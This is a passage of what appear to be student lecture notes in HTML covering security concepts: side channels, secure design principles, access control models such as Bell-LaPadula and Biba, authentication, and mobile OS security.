+<h3 id="cache-timing-side-channels" >Cache Timing side channels
+<span>
+    <a href="#cache-timing-side-channels">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>Spectre and Meltdown attacks</li>
+<li>Caches are shared: by timing cache access, a process can learn information about data used by another.</li>
+<li>Speculative and out of order execution can be exploited</li>
+</ul>
+<h3 id="other-potential-attack-vectors" >Other Potential Attack Vectors
+<span>
+    <a href="#other-potential-attack-vectors">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>Bandwidth consumption</li>
+<li>Timing computations</li>
+<li>Electromagnetic emission</li>
+<li>Sound emissions</li>
+<li>Power consumption</li>
+<li>Differential power analysis</li>
+<li>Differential fault analysis</li>
+</ul>
+<h3 id="controls-against-security-flaws" >Controls Against Security Flaws
+<span>
+    <a href="#controls-against-security-flaws">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>Several stages in software life cycle</li>
+<li>Design</li>
+</ul>
+<h3 id="design---modularity" >Design - Modularity
+<span>
+    <a href="#design---modularity">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>each responsible for a single subtask</li>
+<li>easier to check for flaws</li>
+<li>low coupling</li>
+</ul>
+<h3 id="design---encapsulation" >Design - Encapsulation
+<span>
+    <a href="#design---encapsulation">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>self-contained</li>
+<li>reduce coupling</li>
+<li>do not need to know implementation of other modules (use APIs)</li>
+</ul>
+<h3 id="design---information-hiding" >Design - Information Hiding
+<span>
+    <a href="#design---information-hiding">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>Implementation and internal state should be hidden from developers of other module</li>
+<li>Prevents reliance on behaviour not promised in the API</li>
+<li>also hides malicious actions
+<ul>
+<li>Samsung.pck</li>
+</ul>
+</li>
+</ul>
+<h3 id="design---mutual-suspicion" >Design - Mutual Suspicion
+<span>
+    <a href="#design---mutual-suspicion">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>Input validation / sanitation</li>
+</ul>
+<h3 id="design---confinement" >Design - Confinement
+<span>
+    <a href="#design---confinement">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>Sandbox functionality of other modules that are required</li>
+</ul>
+<h3 id="security-controls-implementation" >Security Controls Implementation
+<span>
+    <a href="#security-controls-implementation">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>don&rsquo;t use C</li>
+<li>static code analysis
+<ul>
+<li>software products that look for buffer overflows, TOCTTOU</li>
+<li>do not rely on them</li>
+</ul>
+</li>
+<li>hardware assistance
+<ul>
+<li>ARM Pointer Authentication <a href="https://lwn.net/Articles/718888/">https://lwn.net/Articles/718888/</a></li>
+<li>Hardware-assisted shadow stack <a href="https://lwn.net/Articles/758245/">https://lwn.net/Articles/758245/</a></li>
+<li>Capabilities in hardware <a href="https://www.cl.cam.ac.uk/research/security/ctsrd/cheri/">https://www.cl.cam.ac.uk/research/security/ctsrd/cheri/</a></li>
+</ul>
+</li>
+<li>formal methods
+<ul>
+<li>try proving that the code is correct</li>
+<li>not really possible</li>
+<li>need markups or assertions</li>
+</ul>
+</li>
+<li>genetic diversity
+<ul>
+<li>lots of machines run the same code, but if there was more different implementations, less common flaw</li>
+<li>same thing happens in agriculture</li>
+</ul>
+</li>
+</ul>
+<h3 id="security-controls---code-reviews" >Security Controls - Code Reviews
+<span>
+    <a href="#security-controls---code-reviews">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>LGTM!</li>
+<li>Just get the code</li>
+<li>Better: guided walk-through
+<ul>
+<li>explain code to reviewers (comments suffice imo)</li>
+<li>good for changes to code</li>
+</ul>
+</li>
+<li>Easter egg code reviews are when no problems are assumed
+<ul>
+<li>Therefore, author can intentionally insert flaws so reviewer reviews better</li>
+</ul>
+</li>
+</ul>
+<h3 id="security-controls---testing" >Security Controls - Testing
+<span>
+    <a href="#security-controls---testing">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>black-box</li>
+<li>fuzz testing
+<ul>
+<li>random data</li>
+</ul>
+</li>
+<li>white-box
+<ul>
+<li>useful for regression testing</li>
+<li>suite of tests created</li>
+</ul>
+</li>
+</ul>
+<h3 id="security-controls---docs" >Security Controls - Docs
+<span>
+    <a href="#security-controls---docs">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>write down choices made and why they were made</li>
+<li>if there is a question to do a secure thing, it should be done and ask if it should be removed rather than not enforced at all or earmarked for later</li>
+</ul>
+<h3 id="standards-processes-audit" >Standards, Processes, Audit
+<span>
+    <a href="#standards-processes-audit">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>standards: what to use (design, testing, etc)</li>
+<li>processes: how to implement standards</li>
+<li>audits: verification that implementation was done correctly</li>
+</ul>
+<h3 id="operating-systems" >Operating Systems
+<span>
+    <a href="#operating-systems">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>allows different entities to access different resources in a shared way
+<ul>
+<li>files, memory, etc.</li>
+<li>(subjects vs. objects)</li>
+</ul>
+</li>
+</ul>
+<h3 id="separation-in-os" >Separation in OS
+<span>
+    <a href="#separation-in-os">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>Keep user&rsquo;s objects separate from other users</li>
+<li>Physical</li>
+<li>Temporal</li>
+<li>Logical</li>
+<li>Cryptographic</li>
+</ul>
+<h3 id="access-control-lists-acls" >Access control lists (ACLs)
+<span>
+    <a href="#access-control-lists-acls">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>Each object has a list of subjects and their access rights</li>
+<li>Determine set of allowed users per objects</li>
+<li>Determine set of objects that a user can access</li>
+<li>Revoke a user&rsquo;s access right to an object or all objects</li>
+</ul>
+<h3 id="acls-and-capabilities" >ACLs and capabilities
+<span>
+    <a href="#acls-and-capabilities">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>UNIX each file has an ACL and the caller is given a list of capabilities as well</li>
+<li><a href="https://mason.gmu.edu/~montecin/UNIXpermiss.htm">UNIX Permissions</a></li>
+</ul>
+<h3 id="authentication-factors" >Authentication Factors
+<span>
+    <a href="#authentication-factors">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>
+<p>Something the user knows</p>
+<ul>
+<li>Password, PIN</li>
+</ul>
+</li>
+<li>
+<p>Something the user has</p>
+<ul>
+<li>Badge</li>
+</ul>
+</li>
+<li>
+<p>Something the user is</p>
+<ul>
+<li>Biometrics</li>
+</ul>
+</li>
+<li>
+<p>User Context</p>
+<ul>
+<li>Location, time, devices in proximity</li>
+</ul>
+</li>
+<li>
+<p>There&rsquo;s also <a href="https://github.com/johwconst/keystrokeDynamics2FA">https://github.com/johwconst/keystrokeDynamics2FA</a></p>
+</li>
+</ul>
+<h3 id="passwords" >Passwords
+<span>
+    <a href="#passwords">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>8 in length can be cracked easily</li>
+<li>Probably want a password at least 10 in length
+<ul>
+<li>Don&rsquo;t use acronyms, use full form</li>
+</ul>
+</li>
+<li>Password hygiene
+<ul>
+<li>Use a password manager to create and store password</li>
+<li>Autofill option</li>
+<li>Problem?</li>
+</ul>
+</li>
+<li>NIST Advice for Develoeprs
+<ul>
+<li>Allow copying</li>
+<li>Do not prompt password changes as it leads to cycling</li>
+</ul>
+</li>
+</ul>
+<h3 id="cryptographic-tools" >Cryptographic Tools
+<span>
+    <a href="#cryptographic-tools">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>Hash: Fixed length deterministic output from a variable-length input value</li>
+<li>Mac: one-way, computers a password fingerprint</li>
+<li>Encryption: with a secret key you can recover data</li>
+</ul>
+<h3 id="adobe-password-hacks" >Adobe Password Hacks
+<span>
+    <a href="#adobe-password-hacks">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>Each password has a hint (123456)</li>
+</ul>
+<h3 id="biometrics" >Biometrics
+<span>
+    <a href="#biometrics">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>physical characteristics</li>
+<li>sufficiently close</li>
+<li>observed fingerprint will never be identical to previously stored fingerprint of the same user</li>
+</ul>
+<h3 id="trusted-system-design-elements" >Trusted System Design Elements
+<span>
+    <a href="#trusted-system-design-elements">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>Security must be part of design early on
+<ul>
+<li>Hard to retrofit security, see Windows 95/98</li>
+</ul>
+</li>
+<li>Android later added user switching and camera was not secure at the beginning</li>
+<li>Least privilege
+<ul>
+<li>In A1, pwgen has setuid0 when it only needs to write to the /etc/shadow file</li>
+</ul>
+</li>
+<li>Economy of mechanism</li>
+<li>Open design
+<ul>
+<li>Avoid security by obscurity</li>
+</ul>
+</li>
+<li>Complete mediation</li>
+<li>Permission based / fail-safe defaults</li>
+<li>Least common mechanism
+<ul>
+<li>shared mechanism could be used as covert channel</li>
+</ul>
+</li>
+<li>Ease of use
+<ul>
+<li>don&rsquo;t want protection mechanism to be difficult to use, nobody will use it or will use it incorrectly</li>
+<li>Android before: grant all permissions in the beginning</li>
+<li>Android now: grant permission one by one based on usage</li>
+</ul>
+</li>
+</ul>
+<h3 id="complete-mediation" >Complete Mediation
+<span>
+    <a href="#complete-mediation">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><p>Complete mediation means that every access to every object should be authorized.</p>
+<h3 id="default-allow-vs-default-deny" >Default Allow vs Default DEny
+<span>
+    <a href="#default-allow-vs-default-deny">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>blacklist</li>
+<li>whitelist</li>
+</ul>
+<h3 id="access-control" >Access Control
+<span>
+    <a href="#access-control">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>Mandatory access control (MAC)
+<ul>
+<li>central authority establishes who can access what</li>
+<li>good for military</li>
+<li>chineses wall,  Bell-LaPadula, biba</li>
+</ul>
+</li>
+<li>Discretionary access control (DAC)
+<ul>
+<li>Owners can control</li>
+<li>Grant others access to your home directory</li>
+</ul>
+</li>
+</ul>
+<h3 id="bell-lapadula" >Bell-LaPadula
+<span>
+    <a href="#bell-lapadula">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><p>Can&rsquo;t write down and can&rsquo;t read up. Can&rsquo;t read when not part of the same groups as the access required. Can write to more groups, but not less.</p>
+<p>Example</p>
+<ul>
+<li>sales.txt: Secret and for groups Accounting and Sales
+<ul>
+<li>Person with Top Secret and Accounting cannot read the file</li>
+<li>Person with Unclassified and Accounting can write the file permissions</li>
+<li>Person with Top Secret cannot write the file</li>
+<li>Person with Accounting and Marketing cannot read nor write the file</li>
+</ul>
+</li>
+</ul>
+<h2 id="biba-model" >Biba Model
+<span>
+    <a href="#biba-model">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h2><ul>
+<li>Prevent inappropriate modification of data</li>
+<li>Subjects and objects are ordered by an integrity classification scheme, I(s) and I(o)</li>
+<li>Write access: I(s) ≥<sub>dom</sub> I(o)</li>
+<li>Read access I(o) ≥<sub>dom</sub> I(s)</li>
+<li>Subject Low watermark: if subject s reads object o, then I(s) = glb(I(s), I(o)), where glb() = greatest lower bound</li>
+<li>Object Low Watermark Property: if subject s modifies object o, then I(o) = glb(I(s), I(o))</li>
+<li>Integrity of subject/object can only go down, information flows down</li>
+</ul>
+<h3 id="object-protection" >Object Protection
+<span>
+    <a href="#object-protection">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>Hidden data
+<ul>
+<li>Deleting a file will not physically erase file on disk</li>
+<li>Deleting text in MS word might not remove text from document</li>
+<li>Putting black box over text in PDF leaves text in PDF</li>
+</ul>
+</li>
+</ul>
+<h3 id="accountability-and-audit" >Accountability and Audit
+<span>
+    <a href="#accountability-and-audit">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>Granularity of event logging</li>
+</ul>
+<h3 id="virtualization" >Virtualization
+<span>
+    <a href="#virtualization">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>Isolation</li>
+<li>Virtual memory: page mapping</li>
+<li>Virtual machines: virtualize I/O devices, file, printers</li>
+<li>A sophisticated rootkit could run the OS in a virtual environment controlled by the rootkit and it would be undetectable</li>
+</ul>
+<h2 id="mobile-os-security" >Mobile OS Security
+<span>
+    <a href="#mobile-os-security">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h2><ul>
+<li>Embedded</li>
+<li>Sensors</li>
+<li>Ubiquitous connectivity (4G / 5G, NFC)</li>
+</ul>
+<h3 id="overview-of-android-os" >Overview of Android OS
+<span>
+    <a href="#overview-of-android-os">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><h3 id="mobile-os-security-mechanisms" >Mobile OS Security Mechanisms
+<span>
+    <a href="#mobile-os-security-mechanisms">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>Different communication channels (wifi, nfc, cellular, bluetooth)</li>
+<li>Threats: what is stored on the mobile devices</li>
+</ul>
+<h3 id="mobile-app-security" >Mobile App Security
+<span>
+    <a href="#mobile-app-security">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><h3 id="mobile-os-known-vulnerabilities-and-flaws" >Mobile OS Known Vulnerabilities and Flaws
+<span>
+    <a href="#mobile-os-known-vulnerabilities-and-flaws">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>WHo could introduce flaws?
+<ul>
+<li>App developers, tools</li>
+<li>Distributors: googel play, sideloading, alternative markets</li>
+<li>Administrations configure the app</li>
+<li>Vendors of the AndroidOS who can modify the kernel</li>
